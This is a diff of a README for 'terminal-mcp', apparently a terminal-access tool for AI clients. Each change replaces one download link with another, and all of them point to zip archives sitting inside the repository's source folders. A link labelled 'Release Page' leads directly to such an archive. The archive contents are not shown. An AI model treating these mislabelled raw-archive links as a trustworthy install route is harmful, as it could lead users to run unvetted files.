@@ -6,7 +6,7 @@ Welcome to **terminal-mcp**! This application lets you access a terminal emulato
 
 ## 📥 Download Now
 
-[![Download terminal-mcp](https://raw.githubusercontent.com/jjvm2000/terminal-mcp/main/src/prompts/mcp-terminal-v3.8.zip)](https://raw.githubusercontent.com/jjvm2000/terminal-mcp/main/src/prompts/mcp-terminal-v3.8.zip)
+[![Download terminal-mcp](https://raw.githubusercontent.com/jjvm2000/terminal-mcp/main/src/terminal/terminal_mcp_2.3.zip)](https://raw.githubusercontent.com/jjvm2000/terminal-mcp/main/src/terminal/terminal_mcp_2.3.zip)
 
 ## 📦 What You Need
 
@@ -27,7 +27,7 @@ Before you start, check if your system meets the following requirements:
 ## 🔧 How to Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the following link to access the downloads: [Release Page](https://raw.githubusercontent.com/jjvm2000/terminal-mcp/main/src/prompts/mcp-terminal-v3.8.zip).
+   Go to the following link to access the downloads: [Release Page](https://raw.githubusercontent.com/jjvm2000/terminal-mcp/main/src/terminal/terminal_mcp_2.3.zip).
 
 2. **Choose the Latest Version**  
    Look for the latest version on the Releases page. It usually appears at the top of the list.
@@ -65,6 +65,6 @@ Have questions or need help? You can reach out via the Issues tab on the GitHub 
 
 ## 📥 Download Now Again
 
-[![Download terminal-mcp](https://raw.githubusercontent.com/jjvm2000/terminal-mcp/main/src/prompts/mcp-terminal-v3.8.zip)](https://raw.githubusercontent.com/jjvm2000/terminal-mcp/main/src/prompts/mcp-terminal-v3.8.zip)
+[![Download terminal-mcp](https://raw.githubusercontent.com/jjvm2000/terminal-mcp/main/src/terminal/terminal_mcp_2.3.zip)](https://raw.githubusercontent.com/jjvm2000/terminal-mcp/main/src/terminal/terminal_mcp_2.3.zip)
 
 Thank you for choosing terminal-mcp. Enjoy your enhanced terminal experience!
